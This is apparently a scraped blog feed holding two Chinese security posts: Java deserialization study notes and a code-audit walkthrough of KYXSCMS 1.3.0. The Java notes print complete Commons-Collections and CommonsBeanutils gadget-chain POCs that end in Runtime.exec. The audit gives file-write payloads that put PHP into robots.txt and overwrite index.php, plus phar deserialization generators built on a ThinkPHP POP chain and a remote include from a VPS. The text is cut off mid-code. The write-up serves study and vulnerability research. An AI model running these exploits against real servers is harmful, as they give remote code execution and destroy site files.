直接作为入口也可以）\n  我们知道 HashSet 其内部实际也是维护了一个 HashMap （忽略了value而已）数据结构，因此在反序列化 readObject 过程中同样也会触发对于 key 的 hashCode 操作\n\nPOC\n\nJava Poc\n  public Serializable getObject(final String command) throws Exception &#123;        final String[] execArgs = new String[] &#123; command &#125;;        final Transformer[] transformers = new Transformer[] &#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;                        String.class, Class[].class &#125;, new Object[] &#123;                        &quot;getRuntime&quot;, new Class[0] &#125;),                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;                        Object.class, Object[].class &#125;, new Object[] &#123;                        null, new Object[0] &#125;),                new InvokerTransformer(&quot;exec&quot;,                        new Class[] &#123; String.class &#125;, execArgs),                new ConstantTransformer(1) &#125;;        Transformer transformerChain = new ChainedTransformer(transformers);        final Map innerMap = new HashMap();        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);        TiedMapEntry entry = new TiedMapEntry(lazyMap, &quot;foo&quot;);        HashSet map = new HashSet(1);        map.add(&quot;foo&quot;);        Field f = null;        try &#123;            f = HashSet.class.getDeclaredField(&quot;map&quot;);        &#125; catch (NoSuchFieldException e) &#123;            f = HashSet.class.getDeclaredField(&quot;backingMap&quot;);        &#125;        // 先拿到内部的 HashMap 成员 instance        Reflections.setAccessible(f);        HashMap innimpl = (HashMap) f.get(map);        Field f2 = null;        try &#123;            f2 = HashMap.class.getDeclaredField(&quot;table&quot;);        &#125; catch (NoSuchFieldException e) &#123;            f2 = HashMap.class.getDeclaredField(&quot;elementData&quot;);        &#125;        Reflections.setAccessible(f2);        Object[] array = (Object[]) f2.get(innimpl);        Object node = array[0];        if(node == null)&#123;            node = array[1];        &#125;        Field keyField = null;        try&#123;            keyField = node.getClass().getDeclaredField(&quot;key&quot;);        &#125;catch(Exception e)&#123;            keyField = Class.forName(&quot;java.util.MapEntry&quot;).getDeclaredField(&quot;key&quot;);        &#125;        Reflections.setAccessible(keyField);        keyField.set(node, entry);        return map;    &#125;\n\n\n\n\n\n\n    这里实际构造的稍微复杂了点，因为构造好的 `TiedMapEntry` 需要放到 HashSet 内部正确的位置上，即：\n\n    HashSet -&gt; HashMap -&gt; Node&lt;K, V&gt; -&gt; K key\n\n    因此还可以简化设计：直接将 HashMap 作为入口点\n\n    - Java Poc2\n\n        public Serializable getObject(final String command) throws Exception &#123;        final String[] execArgs = new String[] &#123; command &#125;;        final Transformer[] fake = new Transformer[] &#123; new ConstantTransformer(1) &#125;;        final Transformer[] transformers = new Transformer[] &#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;                        String.class, Class[].class &#125;, new Object[] &#123;                        &quot;getRuntime&quot;, new Class[0] &#125;),                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;                        Object.class, Object[].class &#125;, new Object[] &#123;                        null, new Object[0] &#125;),                new InvokerTransformer(&quot;exec&quot;,                        new Class[] &#123; String.class &#125;, execArgs),                new ConstantTransformer(1) &#125;;        Transformer transformerChain = new ChainedTransformer(fake);        final Map innerMap = new HashMap();        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);        TiedMapEntry entry = new TiedMapEntry(lazyMap, &quot;foo&quot;);        HashMap expMap = new HashMap();        expMap.put(entry, &quot;valuevalue&quot;);        Reflections.setFieldValue(transformerChain, &quot;iTransformers&quot;, transformers);        lazyMap.remove(&quot;foo&quot;);        return expMap;    &#125;\n\n\n    ![Untitled](Java%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20cf32e5b66f974fa48c4a25d75639abd2/Untitled%208.png)\n\n    **注**：这里最后需要加一个 `lazyMap.remove(&quot;foo&quot;);` 原因在于在构造过程中由于会触发一次 put 操作，虽然这时我们没有加上 RCE gadget，但是还是会将 `TiedMapEntry` 中的 key 加入到 lazymap 中，因此需要在最后将其移出，否则如图所示调用链中断\n\n    ObjectInputStream.readObject()            HashSet.readObject()                HashMap.put()                HashMap.hash()                    TiedMapEntry.hashCode()                    TiedMapEntry.getValue()                        LazyMap.get()                            ChainedTransformer.transform()                            InvokerTransformer.transform()                            Method.invoke()                                Runtime.exec()---------------------------------------------------------------------ObjectInputStream.readObject()            HashMap.readObject()                HashMap.hash()                    TiedMapEntry.hashCode()                    TiedMapEntry.getValue()                        LazyMap.get()                            ChainedTransformer.transform()                            InvokerTransformer.transform()                            Method.invoke()                                Runtime.exec()\n0x04. CC3 动态加载字节码 —— templatesImpl 上场！\n\n特殊的类加载——远程类加载 java.net.URLClassLoader\n\n正常情况下，Java 会根据配置项 sun.boot.class.path 和 java.class.path 中列举到的基础路径（这些路径是经过处理后的 java.net.URL 类）来寻找 .class 文件来加载，而这个基础路径有分为三种情况：\n\nURL未以斜杠 / 结尾，则认为是一个 JAR 文件，使用 JarLoader 来寻找类，即为在Jar包中寻找 .class 文件\nURL以斜杠 / 结尾，且协议名是 file ，则使用 FileLoader 来寻找类，即为在本地文件系统中寻找 .class 文件\nURL以斜杠 / 结尾，且协议名不是 file ，则使用最基础的 Loader 来寻找类\n\n\n\nTemplatesImpl 加载任意字节码的利器\n  sink 点：org.apache.xalan.xsltc.trax.TemplatesImpl.TransletClassLoader#defineClass\n\n  可以调用的 gadget:\n  TemplatesImpl#getOutputProperties() \t\t-&gt; TemplatesImpl#newTransformer() \t\t-&gt; TemplatesImpl#getTransletInstance() \t\t-&gt; TemplatesImpl#defineTransletClasses()\t\t\t\t\t-&gt; TransletClassLoader#defineClass()\n\n利用条件：\n\n_bytecodes 是由字节码组成的数组；\n 其中字节码构成的类的必要条件：必须是com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet 的子类\n\n_name 可以是任意字符串，只要不为 null 即可；\n\n_tfactory 需要是一个 TransformerFactoryImpl 对象，因为 TemplatesImpl#defineTransletClasses() 方法里有调用到 _tfactory.getExternalExtensionsMap() ，如果是 null 会出错。\n\nTemplatesImpl 是对 JAXP 标准中 javax.xml.transform.Templates 接口的实现，前文说了，XSLT 在使用时会先编译成 Java 字节码，这也就是为什么 TemplatesImpl 会使用 defineClass 的原因\n\n\nBCEL ClassLoader 另一加载 ByteCode 利器\nCC3\n\n出现的原因：\n  InvokerTransformer 被 ban\n\n版本限制：jdk ≤ 8u71\n  依赖限制：commons-collections:3.1\n\nTrAXFilter 触发器\n  这里看到其构造函数中直接存在 TemplatesImpl 的调用链入口点\n\n  InstantiateTransformer 新的 Transformer \n  在 transform 时会调用 input 对象指定参数的构造器，配合 TrAXFilter 我们设置 iParamTypes 字段为 Templates.class ， iArgs 为构造好的 templatesImpl 即可\n\n\nPOC\n  后面的构造与 CC1 一致\n\nJava Poc\n  public Object getObject(final String command) throws Exception &#123;\t\tObject templatesImpl = Gadgets.createTemplatesImpl(command);\t\t// inert chain for setup\t\tfinal Transformer transformerChain = new ChainedTransformer(\t\t\tnew Transformer[]&#123; new ConstantTransformer(1) &#125;);\t\t// real chain for after setup\t\tfinal Transformer[] transformers = new Transformer[] &#123;\t\t\t\tnew ConstantTransformer(TrAXFilter.class),\t\t\t\tnew InstantiateTransformer(\t\t\t\t\t\tnew Class[] &#123; Templates.class &#125;,\t\t\t\t\t\tnew Object[] &#123; templatesImpl &#125; )&#125;;\t\tfinal Map innerMap = new HashMap();\t\tfinal Map lazyMap = LazyMap.decorate(innerMap, transformerChain);\t\tfinal Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);\t\tfinal InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);\t\tReflections.setFieldValue(transformerChain, &quot;iTransformers&quot;, transformers); // arm with actual transformer chain\t\treturn handler;\t&#125;\n\n\n\n\n\n\n0x05. Shiro 中的应用\n\nshiro-550 采用 AES 对 cookie 字段的认证信息进行加密，且加密密钥直接硬编码在了代码当中\n攻击流程\n使用以前学过的CommonsCollections利用链生成一个序列化Payload\n使用Shiro默认Key进行加密\n将密文作为rememberMe的Cookie发送给服务端\n\n\nCC6 利用限制：\n\n如果反序列化流中包含非 Java 自身的数组，则会出现无法加载类的错误。这就解释了为什么 CommonsCollections6 无法利用了，因为其中用到了 Transformer 数组。\n\n\n简单修改 CC6 使其适配 shiro\n  首先原因出在了我们使用 Transformer 数组上，因此修改的方向也是不使用非原生数组类型的对象来构造 exp\n  这里借助 LazyMap get 方法传入的参数来完成调用链的衔接。以往是直接忽略参数的，因为 factory 是个自闭合的 transformer[] ，当前 transformer 的 transform 方法参数都由前一个调用结果获得，这里我们利用 get 方法的参数 key 来手动传入即可\n\n  开头还是 CC6 的老套件，key 可以充当 ConstantTransformer 的作用，传入构造好的 templatesImpl 对象，然后利用 InvokerTransformer 调用 newTransformer 方法实现恶意类加载\n\n\nJava Poc\n  public Serializable getObject(final String command) throws Exception &#123;        Object templatesImpl = Gadgets.createTemplatesImpl(command);        InvokerTransformer transformer = new InvokerTransformer(&quot;getClass&quot;, null, null);        final Map innerMap = new HashMap();        final Map lazyMap = LazyMap.decorate(innerMap, transformer);        TiedMapEntry entry = new TiedMapEntry(lazyMap, templatesImpl);        final HashMap expMap = new HashMap();        expMap.put(entry, &quot;valuevalue&quot;);        lazyMap.clear();        Reflections.setFieldValue(transformer, &quot;iMethodName&quot;, &quot;newTransformer&quot;);        return expMap;    &#125;\n\n\n\n\nCC2-CC4\n\n限制\n  commons-collections4:4.0\n\nCC2\n\n触发器\n  java.util.PriorityQueue#readObject() ⇒ … ⇒ java.util.PriorityQueue#siftDownUsingComparator()\n\n  TransformingComparator \n\n\n\nPOC 构造\n  gadget：\n  Gadget chain:\t\tObjectInputStream.readObject()\t\t\tPriorityQueue.readObject()\t\t\t\t...\t\t\t\t\tTransformingComparator.compare()\t\t\t\t\t\tInvokerTransformer.transform()\t\t\t\t\t\t\tMethod.invoke()\t\t\t\t\t\t\t\tRuntime.exec()\n  根据 TransformingComparator#compare() 的描述，要么直接往 transformer 里塞一个构造好的 Transformer[]，要么参照上文 templatesImpl 类加载的方式，参数传入手动构造 gadget\n  yso 项目采用的第二种方式：\n\nJava Poc\n  public Queue&lt;Object&gt; getObject(final String command) throws Exception &#123;\t\tfinal Object templates = Gadgets.createTemplatesImpl(command);\t\t// mock method name until armed\t\tfinal InvokerTransformer transformer = new InvokerTransformer(&quot;toString&quot;, new Class[0], new Object[0]);\t\t// create queue with numbers and basic comparator\t\tfinal PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2,new TransformingComparator(transformer));\t\t// stub data for replacement later\t\tqueue.add(1);\t\tqueue.add(1);\t\t// switch method called by comparator\t\tReflections.setFieldValue(transformer, &quot;iMethodName&quot;, &quot;newTransformer&quot;);\t\t// switch contents of queue\t\tfinal Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, &quot;queue&quot;);\t\tqueueArray[0] = templates;\t\tqueueArray[1] = 1;\t\treturn queue;\t&#125;\n\n\n\n\n\n\n    **注**：`TransformingComparator` 只能在 CC4 版本中使用，之前的版本并未实现 `Serializable` 接口\n\n\n![Untitled](Java%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20cf32e5b66f974fa48c4a25d75639abd2/Untitled%2017.png)\n\nCC4\n  实际上就是 CC3 前半段利用 TrAXFilter 构造函数加载 templatesImpl 恶意类加载与后半段 PriorityQueue 反序列化触发链的结合\n\nJava Poc\n  public Queue&lt;Object&gt; getObject(final String command) throws Exception &#123;\t\tObject templates = Gadgets.createTemplatesImpl(command);\t\tConstantTransformer constant = new ConstantTransformer(String.class);\t\t// mock method name until armed\t\tClass[] paramTypes = new Class[] &#123; String.class &#125;;\t\tObject[] args = new Object[] &#123; &quot;foo&quot; &#125;;\t\tInstantiateTransformer instantiate = new InstantiateTransformer(\t\t\t\tparamTypes, args);\t\t// grab defensively copied arrays\t\tparamTypes = (Class[]) Reflections.getFieldValue(instantiate, &quot;iParamTypes&quot;);\t\targs = (Object[]) Reflections.getFieldValue(instantiate, &quot;iArgs&quot;);\t\tChainedTransformer chain = new ChainedTransformer(new Transformer[] &#123; constant, instantiate &#125;);\t\t// create queue with numbers\t\tPriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, new TransformingComparator(chain));\t\tqueue.add(1);\t\tqueue.add(1);\t\t// swap in values to arm\t\tReflections.setFieldValue(constant, &quot;iConstant&quot;, TrAXFilter.class);\t\tparamTypes[0] = Templates.class;\t\targs[0] = templates;\t\treturn queue;\t&#125;\n\n\n\n\nCC5\n\n版本限制\n\nThis only works in JDK 8u76 and WITHOUT a security manager\n\n  commons-collections:3.1\n\npoc 触发器分析\n  刚开始看到这个安全管理器的限制可能会感到奇怪\n  首先我们还是利用到了 TiedMapEntry ，但这次触发到 getValue gadget 不是通过 hashCode 而是通过 toString\n\n\n反序列化入口：BadAttributeValueExpException\n  分析 readObject 方法，首先会获取序列化流中的 val 字段，并拿到具体对象（Object 类无限制），当 System.*getSecurityManager*() == null 时即可调用到该对象的 toString 方法，这就可以和上文接上\n\n\nJava Poc\n  public BadAttributeValueExpException getObject(final String command) throws Exception &#123;\t\tfinal String[] execArgs = new String[] &#123; command &#125;;\t\t// inert chain for setup\t\tfinal Transformer transformerChain = new ChainedTransformer(\t\t        new Transformer[]&#123; new ConstantTransformer(1) &#125;);\t\t// real chain for after setup\t\tfinal Transformer[] transformers = new Transformer[] &#123;\t\t\t\tnew ConstantTransformer(Runtime.class),\t\t\t\tnew InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;\t\t\t\t\tString.class, Class[].class &#125;, new Object[] &#123;\t\t\t\t\t&quot;getRuntime&quot;, new Class[0] &#125;),\t\t\t\tnew InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;\t\t\t\t\tObject.class, Object[].class &#125;, new Object[] &#123;\t\t\t\t\tnull, new Object[0] &#125;),\t\t\t\tnew InvokerTransformer(&quot;exec&quot;,\t\t\t\t\tnew Class[] &#123; String.class &#125;, execArgs),\t\t\t\tnew ConstantTransformer(1) &#125;;\t\tfinal Map innerMap = new HashMap();\t\tfinal Map lazyMap = LazyMap.decorate(innerMap, transformerChain);\t\tTiedMapEntry entry = new TiedMapEntry(lazyMap, &quot;foo&quot;);\t\tBadAttributeValueExpException val = new BadAttributeValueExpException(null);\t\tField valfield = val.getClass().getDeclaredField(&quot;val&quot;);        Reflections.setAccessible(valfield);\t\tvalfield.set(val, entry);\t\tReflections.setFieldValue(transformerChain, &quot;iTransformers&quot;, transformers); // arm with actual transformer chain\t\treturn val;\t&#125;\n\n\n\n\ngadget chain:\n\nObjectInputStream.readObject()            BadAttributeValueExpException.readObject()                TiedMapEntry.toString()                    LazyMap.get()                        ChainedTransformer.transform()                            ConstantTransformer.transform()                            InvokerTransformer.transform()                                Method.invoke()                                    Class.getMethod()                            InvokerTransformer.transform()                                Method.invoke()                                    Runtime.getRuntime()                            InvokerTransformer.transform()                                Method.invoke()                                    Runtime.exec()\nCC7\n\n版本限制\n  commons-collections:3.1\n\n触发器\n  HashTable:\n  readObejct → reconstitutionPut \n  先来分析一下 HashTable 的 put 操作（readObject 过程发生一样的过程），首先会根据 key 类型计算 hash，再利用 (hash &amp; 0x7FFFFFFF) % tab.length 得到一个哈希表的索引，当该索引对应的条目为 null 时，证明未发生哈希冲突，当前条目可以存放元素，于是创建一个条目并存储相应值。\n  由此我们可以知道，如果想进入 for 循环，则需要满足第二次 put 时元素计算 hash 得到的 index 与上一次相同才可以，即构造出来一个哈希冲突\n  当前面的条件满足时（后面分析如何满足）会触发 e.key.equals(key)，前后的 key 分别时 hashtable 构造放入的两个 lazymap\n\n  之后也就是调用 lazymap 的 equals 方法，由于 HashMap 没有所有会向父类 java.util.AbstractMap 中寻找\n\n\n  说明一下这里参数，上图当中 entry 指代 lazyMap1, 调用的参数指代 lazyMap2（即当前方法的对象 o 和 赋值后的 m）\n\n  紧接着就会触发 lazymap 的 get 利用链 RCE\n  这里需要再次强调：lazymap get 时只有不含指定 key 时才会继续调用 gadget，并且调用一遍之后就会 put 进去，如果想要再次调用的话则需要手动将 key remove 掉（或者直接全部 clear/remove)，这里即需要移出 yy\n\n\n如何构造 hash 碰撞？\n  回到 HashTable，index 的计算如下：\n  (String.hash &amp; 0x7FFFFFFF) % tab.length 也就是让 String 计算的 hash 相同即可，\n\n  value 为实际存储的字符串 char[]， hash 为成员变量\n  对于 yy 和 zZ，第一个字符计算后相差1，那么第二轮次算后，需要前面比后面大31\n\n\n\n\nPOC\n\nJava Poc\n  public Hashtable getObject(final String command) throws Exception &#123;        // Reusing transformer chain and LazyMap gadgets from previous payloads        final String[] execArgs = new String[]&#123;command&#125;;        final Transformer transformerChain = new ChainedTransformer(new Transformer[]&#123;&#125;);        final Transformer[] transformers = new Transformer[]&#123;            new ConstantTransformer(Runtime.class),            new InvokerTransformer(&quot;getMethod&quot;,                new Class[]&#123;String.class, Class[].class&#125;,                new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;),            new InvokerTransformer(&quot;invoke&quot;,                new Class[]&#123;Object.class, Object[].class&#125;,                new Object[]&#123;null, new Object[0]&#125;),            new InvokerTransformer(&quot;exec&quot;,                new Class[]&#123;String.class&#125;,                execArgs),            new ConstantTransformer(1)&#125;;        Map innerMap1 = new HashMap();        Map innerMap2 = new HashMap();        // Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject        Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);        lazyMap1.put(&quot;yy&quot;, 1);        Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);        lazyMap2.put(&quot;zZ&quot;, 1);        // Use the colliding Maps as keys in Hashtable        Hashtable hashtable = new Hashtable();        hashtable.put(lazyMap1, 1);        hashtable.put(lazyMap2, 2);        Reflections.setFieldValue(transformerChain, &quot;iTransformers&quot;, transformers);        // Needed to ensure hash collision after previous manipulations        lazyMap2.remove(&quot;yy&quot;);        return hashtable;    &#125;\n\n\n\n\nCB1\n\n限制\n触发器 BeanComparator\n  衔接之前优先级队列当中会调用比较器的 compare 方法，BeanComparator#compare() 中若 property 字段非 null 的话，则会调用 CB 特有的 PropertyUtils.*getProperty* 递归获取指定属性的 getter 方法并调用\n\n  结合 TemplatesImpl gaget 的调用链，我们可以利用到 org.apache.xalan.xsltc.trax.TemplatesImpl#getOutputProperties \n\n\nPOC\n\nJava Poc\n  public Object getObject(final String command) throws Exception &#123;\t\tfinal Object templates = Gadgets.createTemplatesImpl(command);\t\t// mock method name until armed\t\tfinal BeanComparator comparator = new BeanComparator(&quot;lowestSetBit&quot;);\t\t// create queue with numbers and basic comparator\t\tfinal PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, comparator);\t\t// stub data for replacement later\t\tqueue.add(new BigInteger(&quot;1&quot;));\t\tqueue.add(new BigInteger(&quot;1&quot;));\t\t// switch method called by comparator\t\tReflections.setFieldValue(comparator, &quot;property&quot;, &quot;outputProperties&quot;);\t\t// switch contents of queue\t\tfinal Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, &quot;queue&quot;);\t\tqueueArray[0] = templates;\t\tqueueArray[1] = templates;\t\treturn queue;\t&#125;\n\n\n\n\nC11 —— 魔改 yso\n\n版本限制：无 jdk 版本限制\n  CommonsCollections 3.1-3.2.1\n\nPOC 编写\n\nJava Poc\n  public Serializable getObject(final String command) throws Exception &#123;        Object templatesImpl = Gadgets.createTemplatesImpl(command);        final InvokerTransformer transformer = new InvokerTransformer(&quot;toString&quot;, new Class[0], new Object[0]);        final Map innerMap = new HashMap();        final Map lazyMap = LazyMap.decorate(innerMap, transformer);        TiedMapEntry entry = new TiedMapEntry(lazyMap, templatesImpl);        HashSet map = new HashSet(1);        map.add(&quot;foo&quot;);        Field f = null;        try &#123;            f = HashSet.class.getDeclaredField(&quot;map&quot;);        &#125; catch (NoSuchFieldException e) &#123;            f = HashSet.class.getDeclaredField(&quot;backingMap&quot;);        &#125;        // 先拿到内部的 HashMap 成员 instance        Reflections.setAccessible(f);        HashMap innimpl = (HashMap) f.get(map);        Field f2 = null;        try &#123;            f2 = HashMap.class.getDeclaredField(&quot;table&quot;);        &#125; catch (NoSuchFieldException e) &#123;            f2 = HashMap.class.getDeclaredField(&quot;elementData&quot;);        &#125;        Reflections.setAccessible(f2);        Object[] array = (Object[]) f2.get(innimpl);        Object node = array[0];        if(node == null)&#123;            node = array[1];        &#125;        Field keyField = null;        try&#123;            keyField = node.getClass().getDeclaredField(&quot;key&quot;);        &#125;catch(Exception e)&#123;            keyField = Class.forName(&quot;java.util.MapEntry&quot;).getDeclaredField(&quot;key&quot;);        &#125;        Reflections.setAccessible(keyField);        keyField.set(node, entry);        Reflections.setFieldValue(transformer, &quot;iMethodName&quot;, &quot;newTransformer&quot;);        return map;    &#125;\n\n\n\n\n确实就是 CC1-7 的组合，这里是 CC6 类加载的方式拼接起来就行，后面 InvokerTransformer 利用 `newTransformer` 来调用后续 RCE 即可\n参考链接\n[1] https://h0cksr.xyz/archives/484\n[2] https://amiaaaz.github.io/2022/03/23/java-study-notes-03/\n[3] https://github.com/frohoff/ysoserial\n[4] https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html\n[5] https://boogipop.com/2023/03/02/Java反序列化研究/\n","tags":["JAVA安全"]},{"title":"跟着Y4师傅学代码审计-KYXSCMS_1.3.0","url":"/2022/12/03/KYXSCMS%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/","content":"写在前面CNVD冲冲冲，这里跟着Y4师傅分析复现第二篇KYXSCMS，加油慢慢来\n环境搭建\n伪静态配置\n&lt;IfModule mod_rewrite.c&gt;  Options +FollowSymlinks -Multiviews  RewriteEngine On  RewriteCond %&#123;REQUEST_FILENAME&#125; !-d  RewriteCond %&#123;REQUEST_FILENAME&#125; !-f  RewriteRule ^(.*)$ index.php?/$1 [QSA,PT,L]&lt;/IfModule&gt;\n\n伪静态是相对于真静态而言的,就是把一些asp，php等结尾url通过apche或nginx的重写规则，变成以html一类的静态页面形式。伪静态不是真正的静态，它和动态地址一样要读取数据库。伪静态最主要的作用就是利于seo，百度spider(百度蜘蛛)喜欢抓取静态页面，可容易使百度spider陷入死循环；并发量高的时候会加大服务器的压力，所以用的时候要注意\n\n\n坑点注意\n注意网站安装如果不在根目录的话需要额外配置子目录(我这里是没配出来，放弃了还是直接放在根目录吧)\n\n接着针对不同的功能支持，需要对应打开php扩展\n\n这里还有一个坑就是mysql驱动注意打开pdo配置选项\n还有一个坑就是设置session.save_path避免出现写到权限不够的地方(win)…\n\n\n漏洞分析任意文件写1漏洞点位于模板的模块管理处\n\n任意点一个进行编辑，提交后回显，模板文件修改成功\n\n我们以此定位处理函数位置，全局关键词搜索；或者看模板当中文件引入的路径。\n\n定位至app\\admin\\controller\\Template.php，获取用户输入的POST传参，并传入edit方法，跟入\n\n这里提取出data中的path值和content值，怀疑存在文件写入，跟进put\n\nsink点位于file_put_contents()，中间没有任何过滤\n\n测试正常情况下的传参\ncontent=xxx&amp;path=template/home/default_web/footer.html\n首先可以修改任意文件内容\ncontent=xxx&amp;path=index.php\n当然这样整个网站就没了\n\n\n还有一个思路是刚才在源码中我们看到还有&#123;include &#125;文件包含操作，我们可以和这个文件写漏洞配合起来。\n我们知道根目录存在一个robots.txt文件，写入恶意代码\ncontent=&lt;?php phpinfo(); ?&gt;&amp;path=robots.txt\n然后修改包含文件\n\n\n\nphar反序列化\nbfengj师傅提到这里还可以利用phar反序列化，不过要搞清楚上传文件路径名。还是刚才的函数，查看dirname()\n\n返回 path 的父目录。如果在 path 中没有斜线，则返回一个点（’.‘），表示当前目录。否则返回的是把 path 中结尾的 /component（最后一个斜线以及后面部分）去掉之后的字符串\n\n触发点应该是在mkdir()处，由于dirname会去掉最后一个斜线及后面的部分，所以我们可以多加一层路径来绕过    \n首先写一个恶意的phar文件\n&lt;?phpclass test&#123;    function __destruct()    &#123;        system(&#x27;whoami&#x27;);    &#125;&#125;$a = new test();$tttang = new Phar(&#x27;evil.phar&#x27;, 0);$tttang-&gt;startBuffering();$tttang-&gt;setMetadata($a);$tttang-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);$tttang-&gt;addFromString(&quot;test.txt&quot;, &quot;hacked by RacerZ!&quot;);$tttang-&gt;stopBuffering();\n然后上传恶意文件，记得在最开头添加图片文件头绕过格式检测，回显路径/uploads\\/config\\/20221202\\/6de0863ab8b9e1ab612f660d98ba4457.png\n\n然后利用包含漏洞，使用phar伪协议\npath=phar://./uploads/config/20221202/6de0863ab8b9e1ab612f660d98ba4457.png/123&amp;content=1\n确实识别到了phar，不过不知这个错误是怎么回事\n\n哦哦哦我傻了，咋可能用自己的类来实现反序列化，这里需要依靠thinkphp存在反序列化POP链\n&lt;?phpnamespace think\\process\\pipes &#123;    class Windows    &#123;        private $files;        public function __construct($files)        &#123;            $this-&gt;files = [$files];        &#125;    &#125;&#125;namespace think\\model\\concern &#123;    trait Conversion    &#123;    &#125;    trait Attribute    &#123;        private $data;        private $withAttr = [&quot;lin&quot; =&gt; &quot;system&quot;];        public function get()        &#123;            $this-&gt;data = [&quot;lin&quot; =&gt; &quot;whoami&quot;];        &#125;    &#125;&#125;namespace think &#123;    abstract class Model    &#123;        use model\\concern\\Attribute;        use model\\concern\\Conversion;    &#125;&#125;namespace think\\model&#123;    use think\\Model;    class Pivot extends Model    &#123;        public function __construct()        &#123;            $this-&gt;get();        &#125;    &#125;&#125;namespace &#123;    $conver = new think\\model\\Pivot();    $a = new think\\process\\pipes\\Windows($conver);    @unlink(&quot;phar.phar&quot;);    $phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar    $phar-&gt;startBuffering();    $phar-&gt;setStub(&quot;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub    $phar-&gt;setMetadata($a); //将自定义的meta-data存入manifest    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件//签名自动计算    $phar-&gt;stopBuffering();&#125;\n后面就成了\n\n\nphar 反序列化2\n其实就是再找找还有什么文件读写点\n还是刚才的Template.php文件，看看get传参的逻辑，这里会获取一个参数path，传入file_info方法\n\n进一步跟进File::read($path)\n\n继续跟进get，看到这里也存在一个读函数操作，并且一路上没有过滤很简单的get传参\n\n?path=phar://./uploads/config/20221203/3b9697cca522c894290550257f35ed3d.png\n\n\nphar反序列化3\n位于install()\npublic function install($model=null)&#123;        $Upgrade=model(&#x27;upgrade&#x27;);        if($model==&#x27;insert&#x27;)&#123;            $return=$Upgrade-&gt;insert_install($this-&gt;request-&gt;param(&#x27;id&#x27;));        &#125;else&#123;            $return=$Upgrade-&gt;install();        &#125;        if($return==true)&#123;            return $this-&gt;success(&#x27;安装完成！&#x27;,&#x27;&#x27;);        &#125;else&#123;            $this-&gt;error($Upgrade-&gt;getError(),&#x27;&#x27;);        &#125;    &#125;\n如果model变量值为insert的话就会调用insert_install方法。其中里面upcotent和之前一样\n\n因此得到的upArray变量可控，调用install_file方法，可以看到和上面一样，只需构造suffix，stored_file_name即可\n\n&#123;&quot;0&quot;:&#123;&quot;suffix&quot;:&quot;del&quot;, &quot;stored_file_name&quot;:&quot;phar://xxx&quot;&#125;&#125;\n\nphar 反序列化4 \n接着刚才的继续，其实这里利用的就是远程文件包含了（可能会存在限制），通过stored_file_name字段包含文件，针对文件中的内容，如果满足suffix条件的话就可以直接调用到unlink函数，这又是移除phar反序列化可利用的地方\n$upCode=file_get_contents($value[&#x27;stored_file_name&#x27;]);                $upCode = str_replace(&quot;\\r&quot;, &quot;\\n&quot;, $upCode);                $filePath=explode(&quot;\\n&quot;,$upCode);                foreach ($filePath as $v)&#123;                    $v = trim($v);                    if(empty($v)) continue;                    if($value[&#x27;suffix&#x27;]===&#x27;del&#x27;)&#123;                        @unlink($v);                    &#125;elseif ($value[&#x27;suffix&#x27;]===&#x27;sql&#x27;) &#123;                        $prefix=Config::get(&#x27;database.prefix&#x27;);                        $upSqlCode = str_replace(&quot;`ky_&quot;, &quot;`&#123;$prefix&#125;&quot;, $v);                        try&#123;                            Db::execute($upSqlCode);                        &#125;catch(\\Exception $e)&#123;                            $this-&gt;error=&#x27;执行sql错误代码：&#x27;.$e-&gt;getMessage();                            return false;                        &#125;                    &#125;                &#125;\n&#123;&quot;0&quot;:&#123;&quot;suffix&quot;:&quot;del&quot;, &quot;stored_file_name&quot;:&quot;http://vps/exploit.txt&quot;&#125;&#125;exploit.txt: phar://xxx\n\nphar 反序列化5\n漏洞点位于Upload.php的sublevel_upload()方法\npublic function sublevel_upload()&#123;        if($this-&gt;request-&gt;isPost())&#123;            if($this-&gt;request-&gt;post(&#x27;status&#x27;) == &#x27;chunkCheck&#x27;)&#123;                return $this-&gt;chunkCheck();            &#125;elseif($this-&gt;request-&gt;post(&#x27;status&#x27;) == &#x27;chunksMerge&#x27;)&#123;                if($this-&gt;request-&gt;post(&#x27;name&#x27;))&#123;                    if($file = $this-&gt;chunksMerge($this-&gt;request-&gt;post(&#x27;name&#x27;),$this-&gt;request-&gt;post(&#x27;chunks&#x27;),$this-&gt;request-&gt;post(&#x27;ext&#x27;),$this-&gt;request-&gt;post(&#x27;md5&#x27;)))&#123;                        $file[&#x27;code&#x27;]=1;                        return json($file);                    &#125;                &#125;                return json([&#x27;code&#x27;=&gt;0]);            &#125;else&#123;                $file = $this-&gt;request-&gt;file(&#x27;file&#x27;);                $info = 